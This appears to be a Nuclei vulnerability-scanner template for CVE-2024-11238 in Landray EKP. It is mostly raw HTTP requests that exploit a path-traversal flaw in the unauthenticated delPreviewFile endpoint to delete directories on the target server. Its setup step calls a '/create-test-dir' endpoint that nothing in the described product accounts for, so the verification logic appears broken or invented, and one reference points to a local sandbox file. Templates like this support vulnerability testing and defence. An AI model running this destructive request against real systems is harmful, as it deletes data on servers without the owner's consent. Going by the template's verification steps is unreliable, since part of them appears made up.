id: CVE-2024-11238
info:
  name: Landray EKP - Arbitrary Directory Deletion (delPreviewFile)
  author: nikhilpatidar01
  severity: medium
  description: |
    Landray EKP web application versions v15 and v16 expose an unauthenticated API endpoint
    (/sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile) which fails to sanitize
    the 'directoryPath' parameter. An attacker can perform path traversal ('../') and delete
    directories under the web root (e.g., /resource/<dir>). This template performs a full POC:
    create directory -> confirm file present -> invoke delete -> confirm file removed.
  reference:
    - /mnt/data/LL-exp-02.pdf
    - https://github.com/CoinIsMoney/TempGuide/blob/main/LL-exp-02.pdf
  classification:
    cve-id: CVE-2024-11238
  tags: cve,cve2024,landray,ekp,path-traversal,directory-deletion

# Declare a variable so a single random string is used across all requests
variables:
  testdir: "{{randstr}}"

http:
  - id: create-dir
    name: create test directory
    raw:
      - |+
        GET /create-test-dir?name={{testdir}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Directory created"
        part: body

  - id: verify-exists
    name: verify test file exists
    raw:
      - |+
        GET /resource/{{testdir}}/test.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "poc file"
        part: body

  - id: exploit-delete
    name: delete via delPreviewFile
    raw:
      - |+
        GET /sys/ui/sys_ui_component/sysUiComponent.do?method=delPreviewFile&directoryPath=../{{testdir}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
    matchers:
      - type: status
        status:
          - 200
    # we do not rely solely on a "deleted" text; follow-up verification ensures deletion

  - id: verify-deleted
    name: verify file removed
    raw:
      - |+
        GET /resource/{{testdir}}/test.txt HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
    matchers:
      - type: status
        status:
          - 404
      - type: word
        words:
          - "File not found"
        part: body
